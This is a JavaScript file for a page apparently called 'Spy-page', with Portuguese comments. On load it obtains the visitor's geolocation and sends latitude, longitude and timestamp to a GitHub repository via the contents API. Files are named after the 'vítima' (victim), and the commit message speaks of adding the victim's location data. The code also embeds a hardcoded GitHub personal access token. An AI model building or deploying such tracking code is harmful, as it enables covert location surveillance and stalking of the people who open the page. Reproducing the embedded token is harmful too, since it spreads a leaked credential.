// Função chamada assim que a página for carregada
window.onload = function() {
    console.log("Tentando obter localização...");

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        document.getElementById("location").innerHTML = "Geolocalização não é suportada pelo seu navegador.";
    }
};

// Exibe a localização quando recebida
function showPosition(position) {
    console.log("Localização recebida!");

    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const time = new Date().toISOString();  // Hora no formato ISO

    document.getElementById("location").innerHTML = `Latitude: ${lat} <br> Longitude: ${lon} <br> Hora: ${time}`;

    // Envia os dados para o GitHub
    sendDataToGitHub(lat, lon, time);
}

// Função para enviar os dados para o GitHub
function sendDataToGitHub(lat, lon, time) {
    const token = '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'; // Coloque seu token de acesso pessoal aqui
    const repo = 'Spy-page'; // Nome do seu repositório GitHub
    const path = `data/vitima_${Date.now()}.json`; // Nome do arquivo, pode ser personalizado
    const content = JSON.stringify({
        latitude: lat,
        longitude: lon,
        time: time
    });

    const encodedContent = btoa(content); // Codifica o conteúdo em base64

    // Requisição para criar/editar o arquivo no GitHub
    fetch(`https://api.github.com/repos/SEU_USUARIO/${repo}/contents/${path}`, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${token}`,
            'Accept': 'application/vnd.github.v3+json'
        },
        body: JSON.stringify({
            message: 'Adicionando dados de localização da vítima',
            content: encodedContent
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.content) {
            console.log('Arquivo criado/atualizado no GitHub:', data);
        }
    })
    .catch(error => console.error('Erro ao enviar dados para o GitHub:', error));
}

// Exibe erro se não for possível obter a localização
function showError(error) {
    console.log("Erro ao obter localização:", error);

    switch(error.code) {
        case error.PERMISSION_DENIED:
            document.getElementById("location").innerHTML = "Você negou a permissão para acessar sua localização.";
            break;
        case error.POSITION_UNAVAILABLE:
            document.getElementById("location").innerHTML = "Localização indisponível.";
            break;
        case error.TIMEOUT:
            document.getElementById("location").innerHTML = "Tempo de requisição expirado.";
            break;
        case error.UNKNOWN_ERROR:
            document.getElementById("location").innerHTML = "Erro desconhecido.";
            break;
    }
}
